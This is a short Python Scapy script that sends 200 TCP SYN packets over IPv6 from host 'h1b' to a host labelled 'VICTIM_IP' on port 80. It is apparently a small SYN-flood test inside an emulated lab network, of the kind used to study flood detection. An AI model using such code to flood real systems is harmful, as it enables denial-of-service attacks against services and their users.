import time, logging
from scapy.all import Ether, IPv6, TCP, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

SRC_MAC = "96:29:cc:a3:3d:7f"
DST_MAC = "f2:44:a6:63:0a:48"
VICTIM_IP = "2001:2:1::1"
IFACE = "h1b-eth0"
NUM_PACKETS = 200

print(f"Sending {NUM_PACKETS} SYNs from h1b ({SRC_MAC}) out of {IFACE}...")
for i in range(NUM_PACKETS):
    pkt = Ether(src=SRC_MAC, dst=DST_MAC)/IPv6(src="2001:1:1::2",dst=VICTIM_IP)/TCP(dport=80, sport=12000, flags="S")
    sendp(pkt, iface=IFACE, verbose=0)
    time.sleep(0.01)
print("h1b attack complete.")
